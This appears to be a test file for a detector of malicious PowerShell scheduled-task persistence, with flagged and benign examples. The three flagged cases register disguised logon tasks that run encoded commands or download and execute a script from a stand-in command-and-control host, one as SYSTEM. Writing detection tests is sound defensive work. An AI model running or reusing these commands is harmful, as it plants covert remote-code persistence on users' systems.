# ruleid: ps-scheduled-task-persistence
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
$trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "WindowsUpdate"

# ruleid: ps-scheduled-task-persistence
Register-ScheduledTask -TaskName "Beacon" -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('https://c2.example.com/beacon.ps1')") -RunLevel Highest

# ruleid: ps-scheduled-task-persistence
schtasks /create /sc onlogon /tn "MicrosoftEdgeUpdate" /tr "cmd /c powershell -EncodedCommand SQBFAFgA..." /ru SYSTEM

# ok: ps-scheduled-task-persistence
$action = New-ScheduledTaskAction -Execute "C:\Scripts\Backup.ps1"
$trigger = New-ScheduledTaskTrigger -Daily -At "02:00AM"
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "NightlyBackup" -Description "Daily backup job"

# ok: ps-scheduled-task-persistence
schtasks /create /sc weekly /tn "WeeklyReport" /tr "C:\Reports\generate.bat" /d MON /st 08:00
